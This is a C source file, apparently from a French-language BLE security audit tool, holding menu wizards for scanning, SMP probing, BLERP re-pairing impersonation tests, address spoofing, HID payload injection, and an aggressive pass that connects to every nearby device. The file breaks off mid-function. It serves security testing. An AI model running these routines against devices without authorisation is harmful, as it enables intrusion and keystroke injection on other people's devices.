static int autotry_usage(int rc) {
    fprintf(stderr, "Usage: bleurp autotry [-i index] [-t seconds] [-T ms]\n"
                    "  -t seconds  scan duration before the pass (default 15, > 0)\n"
                    "  -T ms       connection timeout per device (default 4000)\n");
    return rc;
}

// CLI: bleurp autotry [-i index] [-t seconds] [-T ms]. Scans, then runs the
// Auto-Try pass on every device found, without prompts.
static int cmd_autotry(int argc, char **argv) {
    int index = 0;
    long duration = 15;
    long timeout_ms = 4000;

    long v = 0;
    int opt;
    while ((opt = getopt(argc, argv, "i:t:T:h")) != -1) {
        switch (opt) {
        case 'i':
            if (parse_long_arg(optarg, 10, 0, 255, &v) < 0) {
                fprintf(stderr, "autotry: -i invalide '%s' (attendu un index 0-255)\n", optarg);
                return 2;
            }
            index = (int)v;
            break;
        case 't':
            if (parse_long_arg(optarg, 10, 0, LONG_MAX, &duration) < 0) {
                fprintf(stderr, "autotry: -t invalide '%s'\n", optarg);
                return 2;
            }
            break;
        case 'T':
            if (parse_long_arg(optarg, 10, 0, LONG_MAX, &timeout_ms) < 0) {
                fprintf(stderr, "autotry: -T invalide '%s'\n", optarg);
                return 2;
            }
            break;
        case 'h': return autotry_usage(0);
        default:  return autotry_usage(2);
        }
    }
    if (duration <= 0 || timeout_ms <= 0) {
        fprintf(stderr, "autotry: -t et -T doivent etre > 0\n");
        return 2;
    }

    struct dev_table table;
    if (dev_table_init(&table) < 0) { perror("dev_table_init"); return 1; }
    if (run_scan(index, duration, 0, &table) < 0) {
        dev_table_free(&table);
        return 1;
    }
    printf("\nScan termine : %zu appareil(s).\n", dev_table_count(&table));
    run_auto_try(&table, timeout_ms, 0);
    dev_table_free(&table);
    return 0;
}

// After a scan: show the results and propose next steps on a device from
// the list (enum GATT, audit, HID payload, or an Auto-Try pass across all
// of them), or go back. This is the menu's link between "found a device"
// and "do something with it".
static void post_scan_actions(struct dev_table *table) {
    signal(SIGINT, SIG_DFL);
    for (;;) {
        dev_table_sort_by_rssi(table);
        size_t cnt = dev_table_count(table);
        size_t shown = cnt < 20 ? cnt : 20;

        printf("\n  %s%zu appareil(s) trouve(s)%s\n", UI_PINK, cnt, UI_RESET);
        char row[192];
        for (size_t i = 0; i < shown; i++) {
            ui_format_row(row, sizeof row, (int)i + 1, dev_table_at(table, i));
            printf("  %s\n", row);
        }

        printf("\n  %sEtape suivante%s :\n", UI_YELLOW, UI_RESET);
        printf("  %s[-1-]%s Enum GATT      %ssur un appareil de la liste%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-2-]%s Audit GATT     %sacces sans pairing, sur un appareil%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-3-]%s HID Payload    %senvoyer un payload a un appareil%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-4-]%s Auto-Try %s[Agressive]%s %sconnexion sur chaque appareil de la liste%s\n",
               UI_YELLOW, UI_RESET, UI_ORANGE, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-5-]%s SMP Probe      %ssonde d'appairage native (HCI User Channel)%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-6-]%s Test BLERP     %sattaque re-pairing CI (sacca97/blerp)%s\n",
               UI_GREEN, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-Q-]%s Retour au menu principal%s\n\n> ", UI_PINK, UI_RESET, UI_RESET);
        fflush(stdout);

        char line[64];
        if (read_line(line, sizeof line) < 0) return;
        if (line[0] == 'q' || line[0] == 'Q' || line[0] == '\0') return;
        if (line[0] == '4') {
            long timeout_ms = ask_number("Timeout par appareil (ms)",
                "temps max avant d'abandonner une connexion", 4000);
            run_auto_try(table, timeout_ms, 1);
            continue;
        }
        if (line[0] != '1' && line[0] != '2' && line[0] != '3' && line[0] != '5' && line[0] != '6') continue;
        if (shown == 0) { printf("aucun appareil dans la liste.\n"); continue; }

        long num = ask_number("Appareil #", "numero dans la liste ci-dessus", 0);
        if (num < 1 || (size_t)num > shown) {
            printf("numero invalide.\n");
            continue;
        }
        const struct dev_entry *e = dev_table_at(table, (size_t)num - 1);

        printf("\n");
        if (line[0] == '1') {
            do_enum(e->address, e->addr_type);
        } else if (line[0] == '2') {
            do_audit(e->address, e->addr_type);
        } else if (line[0] == '3') {
            char addr_s[18];
            snprintf(addr_s, sizeof addr_s, "%02X:%02X:%02X:%02X:%02X:%02X",
                     e->address[5], e->address[4], e->address[3],
                     e->address[2], e->address[1], e->address[0]);
            run_hid_wizard(addr_s);
        } else if (line[0] == '5') {
            char addr_s[18];
            snprintf(addr_s, sizeof addr_s, "%02X:%02X:%02X:%02X:%02X:%02X",
                     e->address[5], e->address[4], e->address[3],
                     e->address[2], e->address[1], e->address[0]);
            printf("Lancement de la sonde SMP native sur %s...\n", addr_s);
            struct smp_probe_result res;
            if (smp_native_probe_device(0, e->address, e->addr_type, 6000, &res) < 0) {
                fprintf(stderr, "Sonde SMP échouée (vérifiez l'état de l'adaptateur ou lancez ./scripts/reset_bluetooth.sh)\n");
            } else {
                smp_native_print_result(&res, addr_s);
            }
        } else if (line[0] == '6') {
            char addr_s[18];
            snprintf(addr_s, sizeof addr_s, "%02X:%02X:%02X:%02X:%02X:%02X",
                     e->address[5], e->address[4], e->address[3],
                     e->address[2], e->address[1], e->address[0]);
            const char *name = (e->has_name && e->name[0]) ? e->name : "Inconnu";
            char adapter[18];
            struct smp_bond_info bond;
            struct smp_bond_info *pbond = (smp_adapter_addr(0, adapter) == 0 &&
                                           smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, addr_s, &bond) == 0) ? &bond : NULL;
            if (run_blerp_target_test(0, BLERP_ATTACK_CI, e->address, e->addr_type, addr_s, name, e->rssi, pbond)) {
                banner_print_success(stdout);
            }
        }

        if (line[0] != '3') { // run_hid_wizard already pauses on its own
            printf("\n(entree pour continuer) ");
            fflush(stdout);
            char b[8];
            (void)read_line(b, sizeof b);
        }
    }
}

// [-1-] Scan: ask a few short questions (verbose, duration, interface),
// clear the screen and launch the scan. Ctrl-C stops the scan cleanly, then
// the results and a next-steps menu are shown before returning to the menu.
static void menu_scan_wizard(void) {
    signal(SIGINT, SIG_DFL);
    printf("\033[2J\033[H");
    printf("  %s[-1-] Scan%s \342\200\224 quelques questions avant de lancer :\n\n",
           UI_YELLOW, UI_RESET);
    int verbose = ask_yes_no("Verbose",
        "detail vendor/services sous chaque appareil", 1);
    long duration = ask_number("Duree (secondes)",
        "temps de scan ; 0 = illimite jusqu'a Ctrl-C", 30);
    long index = ask_interface(bleurp_hci_find_default_dev());
 
     struct dev_table table;
     if (dev_table_init(&table) < 0) { perror("dev_table_init"); return; }
 
     printf("\033[2J\033[H"); // clear once, then run_scan takes over the view
     int rc = run_scan((int)index, duration, verbose, &table);
     if (rc < 0) {
         printf("\nscan indisponible (voir le message ci-dessus).\n");
         printf("(entree pour revenir au menu) ");
         fflush(stdout);
         char b[8];
         (void)read_line(b, sizeof b);
     } else {
         post_scan_actions(&table);
     }
     dev_table_free(&table);
 }
 
 // Call one of the CLI commands (cmd_repair, cmd_secreq, cmd_autotry) with an
// argument list built by a menu wizard. getopt keeps its position between
// calls, so optind is reset before each one.
static int run_cli_command(int (*cmd)(int, char **), char **args, int n) {
    optind = 1;
    return cmd(n, args);
}

// [-7-] Re-pairing: with no identity address, lists the bonds; with one, runs
// the same check as `bleurp repair` (offers a weaker pairing, reads the reply).
static void menu_repair_wizard(void) {
    signal(SIGINT, SIG_DFL);
    printf("\n  %s=== Re-pairing (BLERP) ===%s\n", UI_PINK, UI_RESET);
    long dev_id = ask_interface(bleurp_hci_find_default_dev());

    printf("  %sIdentité du bond%s  %s(AA:BB:CC:DD:EE:FF ; vide = liste des bonds)%s: ",
           UI_PINK, UI_RESET, UI_PURPLE, UI_RESET);
    fflush(stdout);
    char id[32];
    if (read_line(id, sizeof id) < 0) return;

    char idx[16], type[16] = "public", rpa[32] = "";
    snprintf(idx, sizeof idx, "%ld", dev_id);
    if (id[0] != '\0') {
        printf("  %sType%s  %s(public/random)%s [public]: ", UI_PINK, UI_RESET, UI_PURPLE, UI_RESET);
        fflush(stdout);
        char t[16];
        if (read_line(t, sizeof t) < 0) return;
        if (strncmp(t, "random", 6) == 0) snprintf(type, sizeof type, "random");

        printf("  %sAdresse courante (RPA)%s  %s(vide = identité)%s: ", UI_PINK, UI_RESET, UI_PURPLE, UI_RESET);
        fflush(stdout);
        if (read_line(rpa, sizeof rpa) < 0) return;
    }

    char *args[10];
    int n = 0;
    args[n++] = "repair";
    if (id[0] != '\0') args[n++] = id;
    args[n++] = "-i";
    args[n++] = idx;
    if (id[0] != '\0') {
        args[n++] = "-t";
        args[n++] = type;
        if (rpa[0] != '\0') {
            args[n++] = "-c";
            args[n++] = rpa;
        }
    }

    printf("\n");
    (void)run_cli_command(cmd_repair, args, n);
    printf("\n(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// [-8-] Security Request: waits for the bonded Central to connect, then reports
// how it answers the ARSR we send (`bleurp secreq`). The Central must connect
// during the wait, so this stays interactive.
static void menu_secreq_wizard(void) {
    signal(SIGINT, SIG_DFL);
    printf("\n  %s=== Test Security Request (BLERP) ===%s\n", UI_PINK, UI_RESET);
    long dev_id = ask_interface(bleurp_hci_find_default_dev());

    printf("  %sIdentité du bond%s  %s(AA:BB:CC:DD:EE:FF)%s: ", UI_PINK, UI_RESET, UI_PURPLE, UI_RESET);
    fflush(stdout);
    char id[32];
    if (read_line(id, sizeof id) < 0) return;
    if (id[0] == '\0') {
        printf("  %sadresse d'identité requise.%s\n", UI_RED, UI_RESET);
    } else {
        printf("  %sARSR%s  %s(hex ou décimal ; vide = ARPK estimé du bond)%s: ",
               UI_PINK, UI_RESET, UI_PURPLE, UI_RESET);
        fflush(stdout);
        char arsr[16];
        if (read_line(arsr, sizeof arsr) < 0) return;
        printf("  %sMode%s  %s(1 = standard, 2 = V5 rejet du chiffrement, 3 = V3 réponse plus faible)%s [1]: ",
               UI_PINK, UI_RESET, UI_PURPLE, UI_RESET);
        fflush(stdout);
        char mode_line[8];
        if (read_line(mode_line, sizeof mode_line) < 0) return;
        const char *mode_arg = (mode_line[0] == '2') ? "v5" : (mode_line[0] == '3') ? "v3" : "plain";
        long wait_conn = ask_number("Attente de connexion", "secondes", 60);
        long wait_react = ask_number("Attente de réaction", "secondes", 10);

        char idx[16], conn[16], react[16];
        snprintf(idx, sizeof idx, "%ld", dev_id);
        snprintf(conn, sizeof conn, "%ld", wait_conn);
        snprintf(react, sizeof react, "%ld", wait_react);

        char *args[12];
        int n = 0;
        args[n++] = "secreq";
        args[n++] = id;
        args[n++] = "-i";
        args[n++] = idx;
        args[n++] = "-c";
        args[n++] = conn;
        args[n++] = "-w";
        args[n++] = react;
        args[n++] = "-m";
        args[n++] = (char *)mode_arg;
        if (arsr[0] != '\0') {
            args[n++] = "-r";
            args[n++] = arsr;
        }

        printf("\n  %sAppareil prêt à se connecter, puis Entrée pour lancer : %s", UI_PINK, UI_RESET);
        fflush(stdout);
        char go[8];
        if (read_line(go, sizeof go) < 0) return;
        (void)run_cli_command(cmd_secreq, args, n);
    }

    printf("\n(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// [-9-] Tout tester: scan, then connect and read GATT on every device found
// (`bleurp autotry`). Touches every device in range, so it asks for a typed "oui".
static void menu_autotry_wizard(void) {
    signal(SIGINT, SIG_DFL);
    printf("\n  %s=== Tout tester : appareils découverts ===%s\n", UI_PINK, UI_RESET);
    printf("  %sScan puis connexion sur chaque appareil à portée (les tiens et les autres).%s\n",
           UI_ORANGE, UI_RESET);
    long dev_id = ask_interface(bleurp_hci_find_default_dev());
    long scan_sec = ask_number("Durée du scan", "secondes", 15);
    long timeout_ms = ask_number("Timeout par appareil", "ms", 4000);

    printf("\n  %sTape oui pour lancer (autre chose = annuler) : %s", UI_PINK, UI_RESET);
    fflush(stdout);
    char confirm[16];
    if (read_line(confirm, sizeof confirm) < 0 || strcmp(confirm, "oui") != 0) {
        printf("  annulé.\n");
    } else {
        char idx[16], scan[16], timeout[16];
        snprintf(idx, sizeof idx, "%ld", dev_id);
        snprintf(scan, sizeof scan, "%ld", scan_sec);
        snprintf(timeout, sizeof timeout, "%ld", timeout_ms);
        char *args[] = { "autotry", "-i", idx, "-t", scan, "-T", timeout, NULL };
        (void)run_cli_command(cmd_autotry, args, 7);
    }

    printf("\n(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// [-A-] Audit complet: runs scripts/audit_ble.sh, which has its own menu
// (identification, bond, SMP, re-pairing, Security Request, report).
static void menu_audit_script(void) {
    signal(SIGINT, SIG_DFL);
    const char *script = "scripts/audit_ble.sh";
    if (access(script, X_OK) != 0) {
        printf("  %s[-] %s introuvable ou non exécutable (lance le menu depuis la racine du projet).%s\n",
               UI_RED, script, UI_RESET);
    } else {
        printf("\n");
        fflush(stdout);
        (void)system(script);
    }
    printf("\n(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// Interactive main menu (shown when bleurp runs with no subcommand).
 // [-4-] MAC Spoofer: set the controller's LE static random address (kernel
 // mgmt Set Static Address, 0x002c). Only the *random* address is portable
 // from userspace on Linux this way; the burned-in "public" address needs
 // proprietary, chipset-specific HCI commands and is out of scope here.
 static void menu_mac_spoofer(void) {
     signal(SIGINT, SIG_DFL);
     printf("\033[2J\033[H");
     printf("  %s[-4-] MAC Spoofer%s\n\n", UI_YELLOW, UI_RESET);
     printf("  %sNe change que l'adresse aleatoire statique (random static).%s\n",
            UI_PURPLE, UI_RESET);
     printf("  %sL'adresse publique (burned-in) depend du chipset, pas supportee ici.%s\n\n",
            UI_PURPLE, UI_RESET);
 
     long index = ask_interface(bleurp_hci_find_default_dev());
 
     printf("  %sNouvelle adresse%s (AA:BB:CC:DD:EE:FF) : ", UI_PINK, UI_RESET);
     fflush(stdout);
     char a[64];
     if (read_line(a, sizeof a) < 0 || a[0] == '\0') return;
 
     uint8_t addr[6];
     if (parse_addr(a, addr) < 0) {
         printf("  adresse invalide.\n");
     } else {
         addr[5] |= 0xC0;
 
         int fd = mgmt_open();
         if (fd < 0) {
             perror("mgmt_open");
         } else {
             uint8_t cmd[16], buf[64];
             ssize_t n = mgmt_build_set_static_address(cmd, sizeof cmd, (uint16_t)index, addr);
             if (send_pkt(fd, cmd, n) < 0) {
                 perror("write");
             } else {
                 ssize_t r = read(fd, buf, sizeof buf);
                 struct mgmt_hdr h;
                 uint8_t status = 0xff;
                 if (r >= 9 && mgmt_parse_header(buf, (size_t)r, &h) == 0 &&
                     (h.opcode == MGMT_EV_CMD_STATUS || h.opcode == MGMT_EV_CMD_COMPLETE)) {
                     status = buf[8];
                 }
                 if (status == 0x00) {
                     printf("  %sOK%s : adresse statique = %02X:%02X:%02X:%02X:%02X:%02X\n",
                            UI_GREEN, UI_RESET, addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);
                     printf("  %s(coupez/rallumez l'adaptateur, ou redemarrez le scan, pour"
                            " qu'elle serve en connexion/pub)%s\n", UI_PURPLE, UI_RESET);
                 } else {
                     printf("  %secec%s : mgmt status 0x%02x%s\n", UI_RED, UI_RESET, status,
                            status == 0x14 ? " (Permission Denied : sudo ou setcap requis)" : "");
                 }
             }
             mgmt_close(fd);
         }
     }
 
     printf("\n(entree pour continuer) ");
     fflush(stdout);
     char b[8];
     (void)read_line(b, sizeof b);
 }
 
 // [-5-] SMP Probe wizard
 static void menu_smp_wizard(void) {
     signal(SIGINT, SIG_DFL);
     printf("\033[2J\033[H");
     printf("  %s[-5-] SMP Probe (Native)%s \342\200\224 sonde de sécurité d'appairage BLE\n\n",
            UI_YELLOW, UI_RESET);
 
     printf("%sAddress%s (AA:BB:CC:DD:EE:FF): ", UI_PINK, UI_RESET);
     fflush(stdout);
     char a[64];
     if (read_line(a, sizeof a) < 0 || a[0] == '\0') return;
 
     uint8_t addr[6];
     if (parse_addr(a, addr) < 0) {
         printf("  adresse invalide.\n");
         return;
     }
 
     printf("%sType%s (public/random) [random]: ", UI_PINK, UI_RESET);
     fflush(stdout);
     char t[16];
     uint8_t atype = BLEURP_BDADDR_LE_RANDOM;
     if (read_line(t, sizeof t) == 0 && strncmp(t, "public", 6) == 0) {
         atype = BLEURP_BDADDR_LE_PUBLIC;
     }
 
     long dev_id = ask_interface(bleurp_hci_find_default_dev());
 
     char as[18];
     snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
              addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);
 
     printf("\nConnexion à %s sur hci%ld via HCI User Channel...\n", as, dev_id);
     struct smp_probe_result res;
     if (smp_native_probe_device((int)dev_id, addr, atype, 6000, &res) < 0) {
         fprintf(stderr, "  %s[-] Sonde échouée (vérifiez rfkill/bluetoothd ou exécutez ./scripts/reset_bluetooth.sh)%s\n",
                 UI_RED, UI_RESET);
     } else {
         smp_native_print_result(&res, as);
     }
 
     printf("\n(entree pour continuer) ");
     fflush(stdout);
     char b[8];
     (void)read_line(b, sizeof b);
 }
 
 // [-0-] Pipeline Audit Tout-en-Un (Epitech Security Suite)
static void menu_guided_audit_wizard(void) {
    signal(SIGINT, SIG_DFL);
    printf("\033[2J\033[H");
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %s%s[-0-] Pipeline d'Audit Complet BLEURP (Tout-en-Un)%s\n", UI_YELLOW, UI_BOLD, UI_RESET);
    printf("  %s============================================================%s\n\n", UI_PURPLE, UI_RESET);
    printf("  %sCe wizard enchaîne automatiquement les phases d'audit BLE :%s\n", UI_PINK, UI_RESET);
    printf("    1. Découverte & Fingerprint des cibles avec suggestions\n");
    printf("    2. Reconnaissance GATT & recensement des caractéristiques ouvertes\n");
    printf("    3. Sonde de sécurité SMP (évaluation de robustesse cryptographique)\n");
    printf("    4. Test interactif / simulation HID si applicable\n");
    printf("    5. Synthèse & Rapport d'audit global structuré\n\n");

    long dev_id = ask_interface(bleurp_hci_find_default_dev());
    long scan_sec = ask_number("Durée du scan initial (sec)", "temps d'écoute", 10);
    if (scan_sec <= 0) scan_sec = 10;

    struct dev_table table;
    if (dev_table_init(&table) < 0) {
        perror("dev_table_init");
        return;
    }

    printf("\n  %s[*] Phase 1/5 : Détection et cartographie des appareils...%s\n", UI_PINK, UI_RESET);
    int rc = run_scan((int)dev_id, scan_sec, 1, &table);
    if (rc < 0 || dev_table_count(&table) == 0) {
        printf("  %s[-] Aucun appareil détecté pendant le scan.%s\n", UI_RED, UI_RESET);
        dev_table_free(&table);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    dev_table_sort_by_rssi(&table);
    size_t count = dev_table_count(&table);
    size_t shown = count < 15 ? count : 15;

    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %sPhase 2/5 : Sélection de la Cible & Suggestions d'Audit%s\n", UI_YELLOW, UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);

    char row[192];
    for (size_t i = 0; i < shown; i++) {
        const struct dev_entry *e = dev_table_at(&table, i);
        ui_format_row(row, sizeof row, (int)i + 1, e);
        printf("  %s\n", row);
    }

    printf("\n  %sNuméro de l'appareil à auditer (1-%zu, ou vide pour annuler)%s : ",
           UI_PINK, shown, UI_RESET);
    fflush(stdout);
    char pick_buf[32];
    if (read_line(pick_buf, sizeof pick_buf) < 0 || pick_buf[0] == '\0') {
        dev_table_free(&table);
        return;
    }

    long target_idx = strtol(pick_buf, NULL, 10);
    if (target_idx < 1 || (size_t)target_idx > shown) {
        printf("  %sNuméro invalide.%s\n", UI_RED, UI_RESET);
        dev_table_free(&table);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    const struct dev_entry *target = dev_table_at(&table, (size_t)target_idx - 1);
    uint8_t target_addr[6];
    memcpy(target_addr, target->address, 6);
    uint8_t target_atype = target->addr_type;
    char target_str[18];
    snprintf(target_str, sizeof(target_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             target_addr[5], target_addr[4], target_addr[3],
             target_addr[2], target_addr[1], target_addr[0]);

    printf("\n  %s[+] Cible sélectionnée : %s%s%s (%s, %s)\n",
           UI_GREEN, UI_BOLD, target_str, UI_RESET,
           (target->has_name && target->name[0]) ? target->name : "Nom inconnu",
           target_atype == BLEURP_BDADDR_LE_RANDOM ? "Random RPA" : "Public");

    // Phase 3 : Audit GATT
    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %sPhase 3/5 : Reconnaissance & Audit GATT Non-Intrusif%s\n", UI_YELLOW, UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    do_audit(target_addr, target_atype);

    // Phase 4 : Sonde SMP
    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %sPhase 4/5 : Sonde de Sécurité SMP (Link Layer)%s\n", UI_YELLOW, UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    struct smp_probe_result smp_res;
    memset(&smp_res, 0, sizeof(smp_res));
    int smp_rc = smp_native_probe_device((int)dev_id, target_addr, target_atype, 6000, &smp_res);
    if (smp_rc == 0) {
        smp_native_print_result(&smp_res, target_str);
    } else {
        printf("  %s[-] Sonde SMP non concluante (cible non joignable en liaison directe ou timeout).\n%s", UI_ORANGE, UI_RESET);
    }

    // Phase 5 : Test interactif / HID
    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %sPhase 5/5 : Test d'Interaction / Simulation HID%s\n", UI_YELLOW, UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    int do_hid = ask_yes_no("Tester l'injection HID sur cette cible ?",
                            "nécessite l'autorisation de la cible", 0);
    if (do_hid) {
        run_hid_wizard(target_str);
    }

    // Synthèse
    printf("\n  %s============================================================%s\n", UI_GREEN, UI_RESET);
    printf("  %s%s[+] SYNTHÈSE D'AUDIT BLEURP : %s%s\n", UI_GREEN, UI_BOLD, target_str, UI_RESET);
    printf("  %s============================================================%s\n", UI_GREEN, UI_RESET);
    printf("  • Cible           : %s [%s]\n", target_str, target_atype == BLEURP_BDADDR_LE_RANDOM ? "Random RPA" : "Public");
    printf("  • Nom             : %s\n", (target->has_name && target->name[0]) ? target->name : "Non annoncé");
    printf("  • Statut SMP      : %s\n",
           smp_res.success ? (smp_res.pairing_failed ? "Rejeté (Sécurisé)" : "Répondu (Évaluable)") : "Inaccessible");
    if (smp_res.success && !smp_res.pairing_failed) {
        bool vuln = (smp_res.auth_req & 0x04) == 0 && (smp_res.auth_req & 0x08) == 0;
        printf("  • Niveau de risque: %s%s%s\n",
               vuln ? UI_RED : UI_GREEN,
               vuln ? "ÉLEVÉ (Accepte appairage sans MITM ni Secure Connections)" : "FAIBLE (Exige protection renforcée)",
               UI_RESET);
    }
    printf("  %s============================================================%s\n\n", UI_GREEN, UI_RESET);

    dev_table_free(&table);
    printf("(entree pour revenir au menu principal) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// [-6-] Keyboard Peripheral wizard
 static void menu_keyboard_wizard(void) {
     signal(SIGINT, SIG_DFL);
     printf("\033[2J\033[H");
     printf("  %s[-6-] BLE Keyboard (Peripheral HOGP)%s \342\200\224 émulateur clavier Bluetooth\n\n",
            UI_YELLOW, UI_RESET);
     printf("  %sLe PC diffuse des annonces de Clavier BLE (Appearance 0x03C1, Service 0x1812).%s\n",
            UI_PURPLE, UI_RESET);
     printf("  %sPermet à l'iPhone / Android de se connecter proprement et de négocier l'appairage SMP.%s\n\n",
            UI_PURPLE, UI_RESET);
 
     long dev_id = ask_interface(bleurp_hci_find_default_dev());
 
     printf("  %sNom du périphérique%s [BLEURP Keyboard] : ", UI_PINK, UI_RESET);
     fflush(stdout);
     char name_buf[64];
     const char *name = "BLEURP Keyboard";
     if (read_line(name_buf, sizeof(name_buf)) == 0 && name_buf[0] != '\0') {
         name = name_buf;
     }
 
     printf("\n  %sMode de sécurité SMP%s :\n", UI_PINK, UI_RESET);
     printf("    %s1.%s Just Works (Bonding seul, AuthReq=0x01)\n", UI_YELLOW, UI_RESET);
     printf("    %s2.%s MITM Protection (AuthReq=0x05)\n", UI_YELLOW, UI_RESET);
     printf("    %s3.%s Secure Connections + MITM (AuthReq=0x0D)\n", UI_YELLOW, UI_RESET);
     printf("    %s4.%s Downgrade Test (KeySize=7, AuthReq=0x01)\n", UI_YELLOW, UI_RESET);
     long mode = ask_number("Choix du mode", "1-4", 1);
 
     uint8_t auth = 0x01;
     uint8_t ksize = 16;
     uint8_t iocap = 0x03; // NoInputNoOutput (Just Works)
     if (mode == 2) { auth = 0x05; iocap = 0x00; } // DisplayOnly
     else if (mode == 3) { auth = 0x0D; iocap = 0x03; }
     else if (mode == 4) { auth = 0x01; ksize = 7; iocap = 0x03; }
 
     struct peripheral_config cfg = {
         .dev_id = (int)dev_id,
         .device_name = name,
         .io_capability = iocap,
         .auth_req = auth,
         .max_key_size = ksize,
         .trigger_sec_req = true,
         .payload_file = NULL
     };
 
     peripheral_keyboard_run(&cfg);
 
     printf("\n(entree pour continuer) ");
     fflush(stdout);
     char b[8];
     (void)read_line(b, sizeof b);
 }

// What a Pairing Failed reason tells us about the verdicts (paper §VII-A).
static const char *refusal_meaning(uint8_t reason) {
    switch (reason) {
    case 0x03: return "refus 0x03 (Authentication Requirements) : anti-downgrade MITM actif.";
    case 0x06: return "refus 0x06 (Encryption Key Size) : anti-downgrade de l'entropie actif.";
    case 0x05: return "refus 0x05 (Pairing Not Supported) : non concluant pour le downgrade.";
    default:   return "refus SMP sans lien connu avec un anti-downgrade.";
    }
}

// One verdict line per target, derived from its merged verdicts.
static void print_target_rating(const struct blerp_target_verdict *tv, enum blerp_rating r) {
    if (r == BLERP_RATING_VULNERABLE) {
        char list[64] = "";
        for (int i = 0; i < BLERP_VULN_COUNT; i++) {
            if (tv->v[i] != BLERP_VERDICT_YES) continue;
            size_t used = strlen(list);
            snprintf(list + used, sizeof list - used, "%s%s", used ? " " : "",
                     blerp_vuln_code((enum blerp_vuln)i));
        }
        printf("  %s[!] Verdict : VULNÉRABLE (%s)%s\n", UI_RED, list, UI_RESET);
    } else if (r == BLERP_RATING_PROTECTED) {
        printf("  %s[+] Verdict : PROTÉGÉE. %s%s\n", UI_GREEN,
               tv->refusal ? refusal_meaning(tv->refusal) : "re-pairing non authentifié refusé.",
               UI_RESET);
    } else {
        printf("  %s[?] Verdict : NON CONCLUANT (aucune vulnérabilité confirmée, aucun refus probant).%s\n",
               UI_ORANGE, UI_RESET);
    }
}

// One BLERP test run against a target. Its verdicts are merged into `tv`; the
// caller turns them into a rating. Nothing is claimed here beyond what was seen.
static void eval_target_test(int dev_id, enum blerp_attack_type type,
                             const uint8_t *addr, uint8_t atype,
                             const char *as, const char *name, int8_t rssi,
                             const struct smp_bond_info *pbond,
                             struct blerp_target_verdict *tv) {
    struct blerp_attack_config cfg;
    blerp_config_init(&cfg, type);
    cfg.dev_id = dev_id;
    if (addr) memcpy(cfg.target_addr, addr, 6);
    cfg.target_type = atype;
    cfg.downgraded_authreq = 0x01; // Just Works (BLERP downgrade)
    cfg.downgraded_keysize = 7;    // 7-byte entropy downgrade (KNOB)
    cfg.wait_conn_ms = 4000;
    cfg.wait_react_ms = 5000;
    if (name) strncpy(cfg.adv_name, name, sizeof(cfg.adv_name) - 1);
    if (type == BLERP_ATTACK_PI) {
        if (addr) memcpy(cfg.spoof_addr, addr, 6);
        cfg.spoof_type = atype;
        cfg.reject_enc = true;
    }

    const char *mode_name = (type == BLERP_ATTACK_PI) ? "Peripheral Impersonation (PI)" :
                            (type == BLERP_ATTACK_CI) ? "Central Impersonation (CI)" :
                            "Audit Automatisé V1-V6";

    printf("\n  %s[*] Évaluation BLERP [%s] sur %s (%s, RSSI: %d dBm)...%s\n",
           UI_PINK, mode_name, as ? as : "(broadcast)", name ? name : "Inconnu", (int)rssi, UI_RESET);
    if (pbond) {
        printf("  %s[+] Bond BlueZ existant trouvé : %s, clé %d octets (ARPK)%s\n",
               UI_GREEN, pbond->authenticated ? "authentifié (MITM)" : "non authentifié",
               pbond->enc_size, UI_RESET);
    }

    struct blerp_attack_report rep;
    memset(&rep, 0, sizeof rep);

    int rc = 0;
    if (type == BLERP_ATTACK_PI) {
        rc = blerp_run_pi(&cfg, &rep);
        blerp_classify_vulnerabilities(pbond, &rep, &rep);
    } else if (type == BLERP_ATTACK_CI) {
        rc = blerp_run_ci(&cfg, &rep);
        blerp_classify_vulnerabilities(pbond, &rep, &rep);
    } else {
        rc = blerp_run_audit(&cfg, pbond, &rep);
    }

    if (rc < 0) {
        fprintf(stderr, "  %s[-] Échec de la sonde BLERP sur %s (vérifier droits root/CAP_NET_ADMIN).%s\n",
                UI_RED, as ? as : "", UI_RESET);
        return;
    }

    if (type == BLERP_ATTACK_AUDIT) {
        blerp_print_report(&cfg, pbond, &rep);
    } else {
        for (int i = 0; i < BLERP_VULN_COUNT; i++) {
            if (rep.verdicts[i] == BLERP_VERDICT_YES) {
                printf("  %s[+] %s : %s%s\n", UI_GREEN, blerp_vuln_code((enum blerp_vuln)i),
                       rep.vuln_details[i], UI_RESET);
            }
        }
    }
    blerp_target_verdict_merge(tv, rep.verdicts, rep.pairing_failed ? rep.fail_reason : 0);

    if (rep.phase2_completed) {
        printf("  %s[+] Handshake Phase 2 validé, clé STK dérivée (%d octets).%s\n",
